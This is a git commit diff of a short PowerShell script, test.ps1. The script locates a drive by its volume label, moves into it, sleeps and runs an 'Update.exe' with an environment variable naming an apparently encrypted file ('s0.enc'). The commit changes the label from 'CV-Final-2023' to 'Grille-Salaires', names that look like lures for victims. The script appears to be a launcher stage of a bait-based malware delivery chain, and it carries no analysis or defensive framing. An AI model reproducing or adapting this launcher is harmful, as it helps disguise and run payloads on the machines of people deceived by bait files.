3a4e1cc9d1163fd4b789b5b3fdd83a191237e329
RkDx <61869865+RkDx@users.noreply.github.com>
2022-10-02 03:09:11 +0200

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,5 +1,5 @@
 $Env:hagrid="mdll s0.enc";
-$device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "CV-Final-2023" | foreach { $_.DeviceID });
+$device = (((Get-WmiObject Win32_LogicalDisk) | select DeviceID, VolumeName) | where VolumeName -eq "Grille-Salaires" | foreach { $_.DeviceID });
 cd $device;
 sleep 10;
 .\Update.exe
